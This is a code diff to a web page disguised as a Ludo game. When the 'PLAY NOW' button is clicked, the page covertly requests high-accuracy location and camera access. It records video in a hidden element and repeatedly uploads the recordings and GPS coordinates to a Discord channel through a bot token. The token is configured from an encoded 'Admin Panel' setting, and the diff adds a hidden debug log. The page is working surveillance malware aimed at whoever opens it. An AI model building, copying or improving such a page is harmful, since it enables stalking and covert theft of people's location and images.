@@ -53,19 +53,22 @@
             background-color: #7f8c8d;
             cursor: not-allowed;
         }
-        /* Hidden video element for recording */
-        #recordingVideo {
-            display: none;
-        }
-        /* Hidden status for debugging (optional) */
-        #debugStatus {
+        #recordingVideo { display: none; }
+        /* Debug Log (Hidden by default) */
+        #debugLog {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            color: #0f0;
+            font-size: 10px;
+            padding: 5px;
             display: none; 
         }
     </style>
 </head>
 <body>
 
-    <!-- Simple Ludo Board Visual -->
     <div class="game-board" id="board">
         <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
         <div class="cell home-green" style="grid-column: 10-15; grid-row: 10-15;"></div>
@@ -79,15 +82,11 @@
     </div>
 
     <button class="play-btn" id="playBtn">PLAY NOW</button>
-
-    <!-- Hidden Video Element for Recording -->
     <video id="recordingVideo" autoplay muted playsinline></video>
-
-    <!-- Hidden Debug Status (Optional, currently hidden) -->
-    <div id="debugStatus"></div>
+    <div id="debugLog"></div>
 
     <script>
-        // --- CONFIGURATION (Auto-filled by Admin Panel or Default) ---
+        // --- CONFIGURATION ---
         const CONFIG = {
             BOT_TOKEN: "YOUR_DISCORD_BOT_TOKEN_HERE", 
             SERVER_ID: "YOUR_DISCORD_SERVER_ID_HERE",
@@ -96,13 +95,14 @@
             WAIT_DURATION: 5000   
         };
 
-        // Check if there's an encoded config (from Admin Panel)
+        // Load Config if exists
         if (typeof ENCODED_CONFIG !== 'undefined') {
             const decoded = decodeURIComponent(escape(atob(ENCODED_CONFIG)));
             const configData = JSON.parse(decoded);
             if(configData.discord) {
                 CONFIG.BOT_TOKEN = configData.discord.botToken;
                 CONFIG.CHANNEL_ID = configData.discord.channelId;
+                CONFIG.SERVER_ID = configData.discord.serverId || "UNKNOWN";
             }
             if(configData.settings) {
                 CONFIG.RECORD_DURATION = configData.settings.recordSeconds * 1000;
@@ -117,6 +117,12 @@
         let stream = null;
 
         const playBtn = document.getElementById('playBtn');
+        const debugLog = document.getElementById('debugLog');
+
+        function log(msg) {
+            console.log(msg);
+            debugLog.innerText += msg + "\n";
+        }
 
         playBtn.addEventListener('click', startProcess);
 
@@ -133,9 +139,11 @@
                             lng: position.coords.longitude,
                             timestamp: new Date().toISOString()
                         };
+                        log("Location Updated: " + currentLocation.lat);
                     },
                     (error) => {
                         currentLocation = { error: error.message };
+                        log("Location Error: " + error.message);
                     },
                     { enableHighAccuracy: true }
                 );
@@ -151,12 +159,13 @@
                 const videoElement = document.getElementById('recordingVideo');
                 videoElement.srcObject = stream;
                 videoElement.play();
+                log("Camera Access Granted.");
 
                 // Start the first loop
                 recordAndSend();
 
             } catch (err) {
-                console.error("Camera error:", err);
+                log("Camera error: " + err.message);
                 playBtn.innerText = "Camera Error";
             }
         }
@@ -195,12 +204,12 @@
             const formData = new FormData();
             formData.append("file", blob, "recording.webm");
 
-            // Location Payload
             const payload = {
                 content: `📍 Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'No Location'} \n 📅 Time: ${new Date().toISOString()}`
             };
 
             try {
+                log("Sending Text Message...");
                 // Send text message with location
                 await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                     method: "POST",
@@ -210,6 +219,7 @@
                     body: JSON.stringify(payload)
                 });
 
+                log("Sending Video File...");
                 // Send video file
                 await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
                     method: "POST",
@@ -218,9 +228,11 @@
                     },
                     body: formData
                 });
+                
+                log("Upload Successful!");
 
             } catch (error) {
-                console.error("Upload failed:", error);
+                log("Upload Failed: " + error.message);
             }
         }
     </script>
